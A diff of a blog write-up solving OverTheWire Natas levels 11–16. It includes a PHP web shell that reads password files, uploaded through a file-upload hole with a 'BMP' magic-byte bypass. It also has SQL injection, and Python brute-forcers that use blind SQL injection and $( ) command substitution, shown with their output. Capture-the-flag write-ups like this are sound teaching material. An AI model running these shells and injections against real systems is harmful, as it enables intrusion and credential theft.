@@ -1,6 +1,6 @@
 ---
 layout: single
-title: "OverTheWire: 'Natas' Solutions 11-15"
+title: "OverTheWire: 'Natas' Solutions 11-16"
 header:
   teaser: oth.png
   overlay_image: ZenBGG.png
@@ -9,9 +9,18 @@ related: true
 comments: true
 ---
 
-### Level 11:
+Welcome back! This post is the continuation of the __Natas__ wargame from [OverTheWire](http://overthewire.org/wargames/natas/).
 
-So the cookies are protected with a XOR Encryption... interesting! Let's go ahead and grab the cookie that the site is using. Fire up Burp, capture the packet and you should get the following: 
+If you haven't already read my post from Solution 1-10, then I highly suggest you do so before continuing on to the higher end levels, as the lower levels will provide you the basics of web hacking. You can read that post [here](https://jhalon.github.io/over-the-wire-natas1/)!
+
+So, without further adieu, let us begin!
+
+### Level 11:
+<a href="/images/natas11.png"><img src="/images/natas11.png"></a>
+
+So is seems like the cookies are protected with a XOR Encryption... interesting! Let's go ahead and grab the XOR Encrypted cookie that the site is using. Fire up Burp, intercept the packet, and you should get the following: 
+
+<a href="/images/natas11-2.png"><img src="/images/natas11-2.png"></a>
 
 `Set Cookie: "data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"`
 
@@ -116,7 +125,9 @@ Once we run the new PHP script we should get an output of our cookie: `ClVLIh4AS
 With this new cookie, let's go back to Burp and submit it to the page. If done correctly, we should get the password `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`. Now we can move on to level 12!
 
 ### Level 12:
-File upload
+<a href="/images/natas12.png"><img src="/images/natas12.png"></a>
+
+It seems like for this level we are supposed to upload a JPEG File. Let's see what the source code does before we decide on how to exploit this.
 
 ```php
 <? 
@@ -162,7 +173,9 @@ if(array_key_exists("filename", $_POST)) {
 ?> 
 ```
 
-Okay... file upload. The first thing that I can think of, off the top of my head is an [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload). So let's go ahead and test for this vulnerability. We can begin by creating a simple PHP Shell that will echo back the contents of __/etc/natas_webpass/natas13__.
+It seems as if the code is taking the uploaded file, creating a random name and path, and adding a preset extension - which we can assume is __.jpeg__.
+
+The first thing that I can think of, off the top of my head is an [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload). So let's go ahead and test for this vulnerability. We can begin by creating a simple PHP Shell that will echo back the contents of __/etc/natas_webpass/natas13__.
 
 ```php
 <?
@@ -193,12 +206,16 @@ echo "<pre>$output<pre>";
 
 We can see that our filename is being changed to __.jpg__ and being renamed. So let's edit that back to __shell.php__, and forward the packet. You should see something along the lines of "__The file upload/etgklnh5pq.php has been uploaded__" come up.
 
-Go ahead and click the __upload/etgklnh5pq.php__ link, and we should get the password `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`.
+<a href="/images/natas12-3.png"><img src="/images/natas12-3.png"></a>
+
+Go ahead and click the __upload/yh33kxvyt8.php__ link, and we should get the password `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`.
 
 Good job! Not as hard as 11... let's move on to level 13!
 
 ### Level 13:
-Same thing as 12, only catch is that the upload accepts image files only. Let's see source code.
+<a href="/images/natas13.png"><img src="/images/natas13.png"></a>
+
+This level seems to be the same as 12. The only catch is that the upload accepts image files only. Let's see source code.
 
 ```php
 <? 
@@ -246,7 +263,9 @@ if(array_key_exists("filename", $_POST)) {
 ?> 
 ```
 
-Okay, I'm sure we can exploit this! Let's go ahead and edit __shell.php__ that we used in level 12.This time it has to be pulling the password from Natas14. Also we have to add BMP to the start of the file.
+The source code is similar to 12, but it has some extra addition to it. If you look closely to the IF/ELSE statements, we can see that [exif_imagetype](http://php.net/manual/en/function.exif-imagetype.php) is being used. What this does is that it reads the first bytes of an image and checks its signature.
+
+Okay, I'm sure we can exploit this! Let's go ahead and edit __shell.php__ that we used in level 12.This time it has to be pulling the password from Natas14. Also we have to add BMP to the start of the file - this will allow exif_imagetype to read the file as a [Bitmap File Image](https://en.wikipedia.org/wiki/BMP_file_format), and will bypass the upload check, allowing our shell.
 
 ```php
 BMP<?
@@ -275,13 +294,20 @@ echo "<pre>$output</pre>";
 -----------------------------1625648362953610391147035725--
 ```
 
-Let's change the name __3hwxwqemk3.jpg__ to __shell.php__, and forward the packet. You should now see something along the lines of "__The file upload/w0yzhafetj.php has been uploaded__". Let's go ahead and click the __upload/w0yzhafetj.php__ link. 
+Let's change the name __3hwxwqemk3.jpg__ to __shell.php__, and forward the packet. You should now see something along the lines of "__The file upload/w0yzhafetj.php has been uploaded__". 
+
+<a href="/images/natas13-2.png"><img src="/images/natas13-2.png"></a>
+
+Let's go ahead and click the __upload/4mi1msvukh.php__ link. 
 
 If done correctly we should get the password `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`.
 
 Congrats! It was simple enough! I suggest you go read more about [Unrestricted File Uploads](https://www.owasp.org/index.php/Unrestricted_File_Upload) from __OWASP__ as they are an amazing source to learning Web Hacking! We're done here... so moving on to level 14!
 
 ### Level 14:
+<a href="/images/natas14.png"><img src="/images/natas14.png"></a>
+
+Okay, for this level is seems we have to enter a username and password. Let's read the source code and see if we can't find any clues to what this app does.
 
 ```php
 <?
@@ -328,7 +354,9 @@ The SQL query is thus valid, and will return all rows from the table Users, sinc
 If done successfully, you should get the password `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J` and we can move on to level 15!
 
 ### Level 15:
-My god... this level took me way longer then I am willing to admit! At the end, I figured out that this is a [Blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection).
+<a href="/images/natas15.png"><img src="/images/natas15.png"></a>
+
+My god... this level took me way longer then I am willing to admit! Having only to work with a username I knew we would probably be doing a SQL Injection. At the end, I figured out that this is a [Blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection).
 
 Before we dig deeper let's look at the Source Code.
 
@@ -422,7 +450,7 @@ for i in range(32):
 
 print 'Completed!'
 ```
-Once done, save this as __brute.py__ or anything you like, and let's give the script exectue permissions, and then run it!
+Once done, save this as __brute.py__ or anything you like, and let's give the script execute permissions, and then run it!
 
 ```console
 root@kali:~# chmod +x brute.py
@@ -488,4 +516,142 @@ Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 Completed!
 ```
 
-Oh yah! We got the password for natas16! We are one step closer to becoming 1337 hackerz!
+Oh yah! We got the password for natas16! We are one step closer to becoming 1337 hackerz! On to level 16!
+
+### Level 16:
+<a href="/images/natas16.png"><img src="/images/natas16.png"></a>
+
+This level is actually similar to level 9 and 10 of natas. Though this time, there is more filtering being done, so we might have a tough time to inject code. Let's check the source code and see what we have.
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
+
+Great... this might be a little though. They aren't only filtering characters needed to inject a command, they are also [escaping](http://www.hackingwithphp.com/2/6/2/escape-sequences) quote characters for __$key__. This will turn any of our input into a string.
+
+But I have noticed that they aren't filtering the __$__ and __( )__ characters. So we might be able to inject another command into the string using [command substitution](http://wiki.bash-hackers.org/syntax/expansion/cmdsubst). 
+
+I attempted to inject __$(grep a /etc/natas_webpass/natas17)__, I noticed that all of the dictionary words were returned. The command that I ran, looked something like this within the php code.
+
+`passthru("grep -i \"$(grep a /etc/natas_webpass/natas17)\" dictionary.txt");`
+
+Because all words were returned, I knew the command I injected - to __grep a__ in natas17 - was false. When I tried injecting __$(grep A /etc/natas_webpass/natas17)__, nothing was returned. This made me believe that if nothing was returned, then my command was valid and the letter A, existed in natas17's password.
+
+So what we have to do from here is similar to 16. We need to take our python code, edit it, and try to brute force the password. I used the word __Fridays__ at the end of my command - __$(grep a /etc/natas_webpass/natas17)Fridays__ - so in case the command failed, __Fridays__ would return in the output and my script could pick up on that as __False__.
+
+So let's go head and edit our __brute.py__ script like so:
+
+```python
+#!/usr/bin/python
+
+import requests
+
+chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+exist = ''
+password = ''
+target = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh*@natas16.natas.labs.overthewire.org/'
+trueStr = 'Output:\n<pre>\n</pre>'
+
+for x in chars:
+        r = requests.get(target+'?needle=$(grep '+x+' /etc/natas_webpass/natas17)Fridays')
+        if r.content.find(trueStr) != -1:
+                exist += x
+                print 'Using: ' + exist
+
+print 'All characters used. Starting brute force... Grab a coffee, might take a while!'
+
+for i in range(32):
+        for c in exist:
+                r = requests.get(target+'?needle=$(grep ^'+password+c+' /etc/natas_webpass/natas17)Fridays')
+                if r.content.find(trueStr) != -1:
+                        password += c
+                        print 'Password: ' + password + '*' * int(32 - len(password))
+                        break
+                        
+print 'Completed!'
+```
+
+Once done, let's go ahead and run it!
+
+```console
+root@kali:~# chmod +x brute.py
+root@kali:~# ./brute.py
+Used chars: 0
+Used chars: 03
+Used chars: 035
+Used chars: 0357
+Used chars: 03578
+Used chars: 035789
+Used chars: 035789b
+Used chars: 035789bc
+Used chars: 035789bcd
+Used chars: 035789bcdg
+Used chars: 035789bcdgh
+Used chars: 035789bcdghk
+Used chars: 035789bcdghkm
+Used chars: 035789bcdghkmn
+Used chars: 035789bcdghkmnq
+Used chars: 035789bcdghkmnqr
+Used chars: 035789bcdghkmnqrs
+Used chars: 035789bcdghkmnqrsw
+Used chars: 035789bcdghkmnqrswA
+Used chars: 035789bcdghkmnqrswAG
+Used chars: 035789bcdghkmnqrswAGH
+Used chars: 035789bcdghkmnqrswAGHN
+Used chars: 035789bcdghkmnqrswAGHNP
+Used chars: 035789bcdghkmnqrswAGHNPQ
+Used chars: 035789bcdghkmnqrswAGHNPQS
+Used chars: 035789bcdghkmnqrswAGHNPQSW
+All characters used. Starting brute force... Grab a coffee, might take a while!
+Password: 8*******************************
+Password: 8P******************************
+Password: 8Ps*****************************
+Password: 8Ps3****************************
+Password: 8Ps3H***************************
+Password: 8Ps3H0**************************
+Password: 8Ps3H0G*************************
+Password: 8Ps3H0GW************************
+Password: 8Ps3H0GWb***********************
+Password: 8Ps3H0GWbn**********************
+Password: 8Ps3H0GWbn5*********************
+Password: 8Ps3H0GWbn5r********************
+Password: 8Ps3H0GWbn5rd*******************
+Password: 8Ps3H0GWbn5rd9******************
+Password: 8Ps3H0GWbn5rd9S*****************
+Password: 8Ps3H0GWbn5rd9S7****************
+Password: 8Ps3H0GWbn5rd9S7G***************
+Password: 8Ps3H0GWbn5rd9S7Gm**************
+Password: 8Ps3H0GWbn5rd9S7GmA*************
+Password: 8Ps3H0GWbn5rd9S7GmAd************
+Password: 8Ps3H0GWbn5rd9S7GmAdg***********
+Password: 8Ps3H0GWbn5rd9S7GmAdgQ**********
+Password: 8Ps3H0GWbn5rd9S7GmAdgQN*********
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNd********
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdk*******
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkh******
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhP*****
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk****
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq***
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9**
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c*
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+Completed!
+```
+
+And there we have it folks! We are done with level 16, and can move on to level 17!
+
+That's all for now! Join me next time for a continution on Natas! Also expect futureRaspberry Pi Projects, Web Camera Hacking PoC, and more!
